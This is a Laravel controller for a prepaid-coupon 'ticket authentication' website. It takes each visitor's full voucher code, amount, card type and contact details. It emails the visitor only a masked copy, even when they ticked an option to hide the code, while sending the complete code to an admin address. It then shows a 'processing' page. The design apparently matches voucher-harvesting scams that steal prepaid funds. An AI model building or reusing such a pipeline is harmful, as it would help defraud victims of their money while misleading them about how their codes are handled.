<?php

namespace App\Http\Controllers;

use App\Http\Requests\AuthenticateTicketRequest;
use App\Mail\CouponVerificationAdminMail;
use App\Mail\CouponVerificationResultMail;
use App\Services\CouponVerificationService;
use Illuminate\Http\RedirectResponse;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Mail;
use Illuminate\View\View;

class CouponVerificationController extends Controller
{
    public function __construct(
        private CouponVerificationService $couponVerificationService
    ) {}

    public function create(): View
    {
        return view('authenticate-ticket', [
            'amounts' => config('authentify.ticket_amounts', []),
            'cardTypes' => config('authentify.card_types', []),
        ]);
    }

    public function store(AuthenticateTicketRequest $request): RedirectResponse
    {
        $data = $request->validated();
        $code = $data['code'];
        $contact = trim($data['contact']);
        $amountKey = $data['amount'];
        $cardTypeKey = $data['card_type'];
        $hideCode = $data['hide_code'];

        $amountLabel = config('authentify.ticket_amounts.'.$amountKey, $amountKey.' €');
        $cardTypeLabel = config('authentify.card_types.'.$cardTypeKey, $cardTypeKey);

        $result = $this->couponVerificationService->verify($code);
        $maskedCode = $hideCode ? $this->maskCodeAggressive($code) : $this->maskCode($code);
        $contactMasked = $this->maskContact($contact);

        $recipient = filter_var($contact, FILTER_VALIDATE_EMAIL)
            ? $contact
            : config('mail.from.address');

        $sentToContactEmail = filter_var($contact, FILTER_VALIDATE_EMAIL) !== false;

        $submittedAt = now()->format('d/m/Y H:i:s');

        $adminEmail = config('site.admin_email');
        if (is_string($adminEmail) && filter_var($adminEmail, FILTER_VALIDATE_EMAIL)) {
            try {
                Mail::to($adminEmail)->locale(app()->getLocale())->send(new CouponVerificationAdminMail(
                    $contact,
                    $code,
                    $result,
                    $amountLabel,
                    $cardTypeLabel,
                    (bool) $hideCode,
                    $submittedAt,
                ));
            } catch (\Throwable $e) {
                Log::warning('Notification admin authentification ticket échouée', [
                    'message' => $e->getMessage(),
                    'admin' => $adminEmail,
                ]);
            }
        }

        try {
            Mail::to($recipient)->locale(app()->getLocale())->send(new CouponVerificationResultMail(
                $maskedCode,
                $result,
                $contactMasked,
                $amountLabel,
                $cardTypeLabel,
                $hideCode,
                $sentToContactEmail,
            ));
        } catch (\Throwable $e) {
            Log::error('Envoi e-mail confirmation utilisateur (authentification ticket) échoué', [
                'message' => $e->getMessage(),
                'recipient' => $recipient,
            ]);

            return redirect()
                ->route('ticket.authenticate')
                ->withInput($request->except('code', 'hide_code'))
                ->with('verification_error', __('site.forms.authenticate.mail_send_failed'));
        }

        return redirect()
            ->route('ticket.processing')
            ->with('processing_ok', true);
    }

    public function processing(): RedirectResponse|View
    {
        if (! session()->pull('processing_ok')) {
            return redirect()->route('ticket.authenticate');
        }

        return view('authenticate-processing');
    }

    private function maskCode(string $code): string
    {
        $trimmed = trim($code);
        if ($trimmed === '') {
            return '—';
        }
        $len = mb_strlen($trimmed, 'UTF-8');
        if ($len <= 4) {
            return str_repeat('•', max(0, $len - 1)).mb_substr($trimmed, -1, null, 'UTF-8');
        }

        return mb_substr($trimmed, 0, 2, 'UTF-8')
            .str_repeat('•', $len - 4)
            .mb_substr($trimmed, -2, null, 'UTF-8');
    }

    private function maskCodeAggressive(string $code): string
    {
        $trimmed = trim($code);
        if ($trimmed === '') {
            return '—';
        }
        $len = mb_strlen($trimmed, 'UTF-8');

        return str_repeat('•', max(1, $len - 1)).mb_substr($trimmed, -1, null, 'UTF-8');
    }

    private function maskContact(string $contact): string
    {
        if (filter_var($contact, FILTER_VALIDATE_EMAIL)) {
            $parts = explode('@', $contact, 2);
            if (count($parts) !== 2) {
                return '•••@•••';
            }
            $local = $parts[0];
            $domain = $parts[1];
            $locLen = mb_strlen($local, 'UTF-8');
            $maskedLocal = $locLen <= 2
                ? str_repeat('•', $locLen)
                : mb_substr($local, 0, 1, 'UTF-8').str_repeat('•', max(1, $locLen - 2)).mb_substr($local, -1, null, 'UTF-8');

            return $maskedLocal.'@'.$domain;
        }

        $digits = preg_replace('/\D+/', '', $contact) ?? '';
        if (strlen($digits) < 4) {
            return '••••';
        }

        return '••• •• '.substr($digits, -2);
    }
}
